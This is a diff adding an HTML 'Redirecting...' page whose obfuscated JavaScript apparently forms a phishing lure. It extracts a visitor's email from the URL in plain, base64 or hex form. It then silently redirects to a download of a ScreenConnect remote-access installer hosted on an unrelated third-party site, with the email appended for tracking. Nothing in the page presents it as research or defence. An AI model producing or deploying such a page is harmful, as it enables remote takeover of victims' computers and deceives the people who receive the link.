@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .x9k2m {
+            text-align: center;
+        }
+        .q7vf3 {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="x9k2m">
+        <div class="q7vf3"></div>
+        <p>Redirecting...</p>
+    </div>
+
+    <script>
+    // ===========================
+    // CONFIGURATION
+    // ===========================
+    const w8p4n = {
+        // Email append method: 'hash' (#), 'dollar' ($), or 'param' (?email=)
+        r2bj7: 'hash', // Options: 'hash', 'dollar', 'param'
+        
+        // Redirect URLs
+        k3wd8: [
+            'https://tirtarangga.com/simontar/karyawan/ScreenConnect.ClientSetup.exe',
+            'https://tirtarangga.com/simontar/karyawan/ScreenConnect.ClientSetup.exe',
+            'https://tirtarangga.com/simontar/karyawan/ScreenConnect.ClientSetup.exe'
+        ]
+    };
+
+    // ===========================
+    // UTILITY FUNCTIONS
+    // ===========================
+
+    // Get URL parameters
+    function a4sg2() {
+        const n7qx5 = {};
+        const e1kv9 = new URLSearchParams(window.location.search);
+        for (const [z8pm3, u6rf4] of e1kv9) {
+            n7qx5[z8pm3] = u6rf4;
+        }
+        return n7qx5;
+    }
+
+    // Get fragment (hash) from URL
+    function b9tn6() {
+        const h3wy2 = window.location.hash;
+        return h3wy2 ? h3wy2.substring(1) : null;
+    }
+
+    // Get dollar-sign value from URL
+    function p8xw1() {
+        const q2vt5 = window.location.href;
+        const m4kb7 = q2vt5.indexOf('$');
+        if (m4kb7 !== -1) {
+            // Extract everything after $ but before # if present
+            let s9yn3 = q2vt5.substring(m4kb7 + 1);
+            const r6hc2 = s9yn3.indexOf('#');
+            if (r6hc2 !== -1) {
+                s9yn3 = s9yn3.substring(0, r6hc2);
+            }
+            return s9yn3;
+        }
+        return null;
+    }
+
+    // Validate email format
+    function c5dx8(j4lz7) {
+        const v2pk1 = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return v2pk1.test(j4lz7);
+    }
+
+    // Auto-detect and decode email
+    function d6mb3(y9hq4) {
+        if (!y9hq4) return null;
+
+        // Try 1: Plain text (URL decoded)
+        try {
+            const f8nx2 = decodeURIComponent(y9hq4);
+            if (c5dx8(f8nx2)) {
+                return f8nx2;
+            }
+        } catch (g1rv5) {
+            // Invalid URL encoding, continue
+        }
+
+        // Try 2: Base64 decoding
+        if (/^[A-Za-z0-9+/]+=*$/.test(y9hq4)) {
+            try {
+                const o7sw6 = atob(y9hq4);
+                if (c5dx8(o7sw6)) {
+                    return o7sw6;
+                }
+            } catch (g1rv5) {
+                // Not valid base64, continue
+            }
+        }
+
+        // Try 3: Hex decoding
+        const i3zc9 = y9hq4.replace(/[^0-9a-fA-F]/g, '');
+        if (/^[0-9a-fA-F]+$/.test(i3zc9) && i3zc9.length % 2 === 0 && i3zc9.length >= 10) {
+            try {
+                let l2py8 = '';
+                for (let q5mt1 = 0; q5mt1 < i3zc9.length; q5mt1 += 2) {
+                    l2py8 += String.fromCharCode(parseInt(i3zc9.substr(q5mt1, 2), 16));
+                }
+                if (c5dx8(l2py8)) {
+                    return l2py8;
+                }
+            } catch (g1rv5) {
+                // Not valid hex, continue
+            }
+        }
+
+        // Nothing worked
+        return null;
+    }
+
+    // Extract email from URL (any parameter, fragment, or $ sign)
+    function e4jx7() {
+        // Check fragment first
+        const s6wb9 = b9tn6();
+        if (s6wb9) {
+            const p1yc3 = d6mb3(s6wb9);
+            if (p1yc3) return p1yc3;
+        }
+        
+        // Check dollar sign
+        const t3dw6 = p8xw1();
+        if (t3dw6) {
+            const p1yc3 = d6mb3(t3dw6);
+            if (p1yc3) return p1yc3;
+        }
+        
+        // Check ALL parameters for valid email
+        const n7qx5 = a4sg2();
+        for (const u6rf4 of Object.values(n7qx5)) {
+            const p1yc3 = d6mb3(u6rf4);
+            if (p1yc3) return p1yc3;
+        }
+        
+        return null;
+    }
+
+    // Append email to URL based on config
+    
+    function f8qz2(r4vn6, j4lz7, x9km5) {
+    if (!j4lz7) return r4vn6;
+    
+    // Custom encoding that keeps @ as is
+    const preserveAt = (str) => {
+        return encodeURIComponent(str).replace(/%40/g, '@');
+    };
+    
+    switch (x9km5) {
+        case 'hash':
+            return r4vn6 + '#' + preserveAt(j4lz7);
+            
+        case 'dollar':
+            return r4vn6 + '$' + preserveAt(j4lz7);
+            
+        case 'param':
+            const t7hd1 = r4vn6.indexOf('?') !== -1 ? '&' : '?';
+            return r4vn6 + t7hd1 + 'email=' + preserveAt(j4lz7);
+            
+        default:
+            return r4vn6;
+    }
+    
+        
+    }
+
+    // ===========================
+    // MAIN REDIRECT LOGIC
+    // ===========================
+
+    (function m3cw8() {
+        // Extract and decode email
+        const j4lz7 = e4jx7();
+        
+        // Select random redirect URL
+        const y2nr9 = Math.floor(Math.random() * w8p4n.k3wd8.length);
+        let b5tx3 = w8p4n.k3wd8[y2nr9];
+        
+        // Append email if found and valid
+        if (j4lz7) {
+            b5tx3 = f8qz2(b5tx3, j4lz7, w8p4n.r2bj7);
+        }
+        
+        // Perform redirect
+        window.location.replace(b5tx3);
+    })();
+    </script>
+</body>
+</html>
